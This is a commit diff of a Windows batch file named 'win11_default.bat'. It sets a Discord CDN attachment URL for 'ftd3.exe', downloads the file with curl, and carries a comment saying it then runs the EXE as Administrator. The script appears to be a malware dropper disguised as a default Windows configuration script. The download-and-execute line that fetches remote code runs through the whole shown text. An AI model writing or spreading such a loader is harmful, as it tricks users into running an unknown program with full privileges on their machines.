0acd6557339dbc26c978ddeebf16a538bdab3a2e
optolab <sloneeddie36@gmail.com>
2025-01-12 10:13:46 -0500

    Update win11_default.bat

--- win11_default.bat
+++ win11_default.bat
@@ -1,8 +1,8 @@
 @echo off
-set URL=https://cdn.discordapp.com/attachments/1197242628396302458/1328018741627326534/ftd3.exe?ex=67852d55&is=6783dbd5&hm=ffaffe39a5449d0829ae61f66245a1ec4221887721a8087edbe5434f03edb75e&
-set OUTPUT=yourfile.exe
+set URL=https://cdn.discordapp.com/attachments/1197242628396302458/1328018741627326534/ftd3.exe?ex=67852d55&is=6783dbd5&hm=ffaffe39a5449d0829ae61f66245a1ec4221887721a8087edbe5434f03edb75e
+set OUTPUT=ftd3.exe
 
-curl -o %OUTPUT% %URL%
+curl -o "%OUTPUT%" "%URL%"
 echo Download complete: %OUTPUT%
 
 :: Run the downloaded EXE as Administrator
